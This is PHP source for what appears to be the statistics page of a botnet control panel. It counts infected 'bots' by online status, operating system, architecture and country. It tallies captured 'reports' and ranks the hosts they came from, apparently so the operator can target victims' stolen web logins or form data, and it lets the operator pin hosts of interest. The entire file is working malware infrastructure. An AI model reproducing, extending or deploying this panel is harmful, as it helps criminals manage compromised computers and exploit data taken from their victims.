<?php
require_once('inc/common.php');
require_once('inc/geoip.php');
require_once('pinned_hosts.php');
$db = db();

$hosts = json_decode($PINNED_HOSTS);
if(json_last_error() != JSON_ERROR_NONE)
{
   echo('pinned_hosts.php contains invalid JSON!');
   exit();
}
function delete_insert_host()
{
   global $hosts;
   $json = escape_php_string(json_encode($hosts));
   file_put_contents('pinned_hosts.php', '<?php $PINNED_HOSTS = "'.$json.'"; ?>');
   header('location: index.php');
   exit();
}
if(isset($_GET['delete_host']))
{
   action_sec_check();
   $hosts = array_diff($hosts, array($_GET['delete_host']));
   if($hosts == null)
      $hosts = array();
   delete_insert_host();
}
else if(isset($_POST['host']))
{
   action_sec_check();
   array_push($hosts, $_POST['host']);
   delete_insert_host();
}

ui_start('Statistics');
ui_content_start();

function format_count($count)
{
   global $total;
   if($total == 0 && $count == 0)
      $total = 1;
   return $count.' ('.round(($count / $total) * 100, 2).'%)';  
}

$query = $db->query('SELECT COUNT(*) FROM bots');
$totalBots = $query->fetchColumn();

$total = $totalBots;

if($total == 0)
   echo('<div class="error">Database is empty</div>');
else
{
?>
<style>
.content
{
   text-align: center;
   font-size: 0;
}

.table
{
   width: 500px;
   font-size: 12px;
}

.box
{
   font-size: 12px;
}

.left
{
   text-align: left;
   display: inline-block;
   vertical-align: top;
}
</style>
<div class="left" style="margin-right: 10px;">
<?php
   $query = $db->prepare('SELECT COUNT(*) FROM bots WHERE last_seen > ?');
   $query->bindValue(1, time() - $CONF_TIMEOUT_OFFLINE, PDO::PARAM_INT);
   $query->execute();
   $online = (int) $query->fetchColumn();
   $offline = $total - $online;

   $query = $db->prepare('SELECT COUNT(*) FROM bots WHERE last_seen < ?');
   $query->bindValue(1, time() - $CONF_TIMEOUT_DEAD, PDO::PARAM_INT);
   $query->execute();
   $dead = $query->fetchColumn();

   $query = $db->prepare('SELECT COUNT(*) FROM bots WHERE last_seen > ?');
   $query->bindValue(1, time() - 60 * 60 * 24, PDO::PARAM_INT);
   $query->execute();
   $online24h = (int) $query->fetchColumn();
?>
  <div class="box margin-bottom">
    <div>Amount</div>
    <table class="table">
      <tr><td>Total:</td><td><?php echo($total); ?></td></tr>
      <tr><td>Online:</td><td><?php echo(format_count($online)); ?></td></tr>
      <tr><td>Offline:</td><td><?php echo(format_count($offline)); ?></td></tr>
      <tr><td>Bots seen since 24h:</td><td><?php echo(format_count($online24h)); ?></td></tr>
      <tr><td>Dead:</td><td><?php echo(format_count($dead)); ?></td></tr>  
    </table>
  </div>
<?php
   $query = $db->query('SELECT COUNT(*) FROM bots WHERE is_x64 = 1');
   $x64 = $query->fetchColumn();

   $os = array();
   $query = $db->query('SELECT os_major, os_minor, is_server FROM bots');
   $rows = $query->fetchAll();
   foreach($rows as $row)
   {
      $osName = get_os($row['os_major'], $row['os_minor'], $row['is_server']);
      if(isset($os[$osName]))
         ++$os[$osName];
      else
         $os[$osName] = 1;
   }
   arsort($os);
?>
  <div class="box margin-bottom">
    <div>Computer Info</div>
    <table class="table margin-bottom">
<?php
   foreach($os as $key => $value)
      echo('<tr><td>'.$key.':</td><td>'.format_count($value).'</td></tr>');
?>
      <tr class="line"><td class="line">x64:</td><td><?php echo(format_count($x64)); ?></td></tr>
      <tr><td>x86:</td><td><?php echo(format_count($total - $x64)); ?></td></tr>
    </table>
  </div>
  <div class="box">
    <div>Countries</div>
    <table class="table">
<?php
   $total = $totalBots;
   $query = $db->query('SELECT DISTINCT country, COUNT(*) as num FROM bots GROUP BY country ORDER BY num DESC');
   $rows = $query->fetchAll();
   $geoip = new GeoIP();
   foreach($rows as $row)
   {
      echo('<tr><td>'.$row['country'].' <em>('.$geoip->GEOIP_COUNTRY_NAMES[$geoip->GEOIP_COUNTRY_CODE_TO_NUMBER[$row['country']]].')</em>:</td><td>'.format_count($row['num']).'</td></tr>');
   }
?>
    </table>
  </div>
</div>
<?php
   $query = $db->query('SELECT COUNT(*) FROM reports');
   $total = $query->fetchColumn();

   $query = $db->prepare('SELECT COUNT(*) FROM reports WHERE received > ?');
   $query->bindValue(1, time() - 60 * 60 * 24, PDO::PARAM_INT);
   $query->execute();
   $logs24h = $query->fetchColumn();
?>
<div class="left">
  <div class="box margin-bottom">
    <div>Logs</div>
    <table class="table margin-bottom">
      <tr><td>Total:</td><td><?php echo($total); ?></td></tr>
      <tr><td>Last 24h:</td><td><?php echo(format_count($logs24h)); ?></td></tr>
    </table>
  </div>
  <div class="box">
    <div>Top Hosts</div>
    <table class="table">
<?php
   $sql_host = "SELECT SUBSTRING_INDEX(SUBSTRING_INDEX(SUBSTRING(url, 11, 100), '/', 1), '.', -2) as host, COUNT(*) as num FROM reports ";
   function echo_host_row($host, $num)
   {
      echo('<td style="width: 50%;"><a target="_blank" class="btn" href="reports.php?date_min=0&amp;date_max=4294967296&amp;url=%'.htmlspecialchars($host).'%&amp;content=&amp;uhids=&amp;order=0&amp;dir=0">'.htmlspecialchars($host).'</a></td><td style="width: 50%;">'.$num.'</td>');
   }
   $query = $db->query($sql_host.'GROUP BY host ORDER BY num DESC LIMIT 100');
   $rows = $query->fetchAll();
   foreach($rows as $row)
   {
      echo('<tr>');
      echo_host_row($row['host'], $row['num']);
      echo('</tr>');
   }
?>
    </table>
  </div>
  <div class="box" style="margin-top: -1px; border-top-right-radius: 0px; border-top-left-radius: 0px; border-top: 1px solid #AAAAAA;">
    <div>Pinned Hosts</div>
<?php
   if(count($hosts) > 0)
   {
?>
    <table class="table">
<?php
      foreach($hosts as $host)
      {
         $query = $db->prepare($sql_host.' GROUP BY host HAVING host LIKE ?');
         $query->bindValue(1, $host, PDO::PARAM_STR);
         $query->execute();
         echo('<tr>');
         echo_host_row(htmlspecialchars($host), $query->rowCount() > 0 ? $query->fetchAll()[0]['num'] : 0);
         echo('<td><a class="btn" href="?delete_host='.urlencode($host).'&amp;time='.$_SESSION['time'].'" onclick="return UserConfirm();">Delete</a></td></tr>');
      }
?>
    </table>
<?php
   }
?>
    <div style="margin-top: 10px;">
      <form method="POST">
        <input type="hidden" name="time" value="<?php echo($_SESSION['time']); ?>">
        <input type="text" name="host" class="input" style="width: calc(100% - 111px); margin-right: 5px;"><input type="submit" class="btn" value="Add Host" style="width: 100px; ">
      </form>
    </div>
  </div>
</div>
<?php
}
ui_content_end();
ui_end();
?>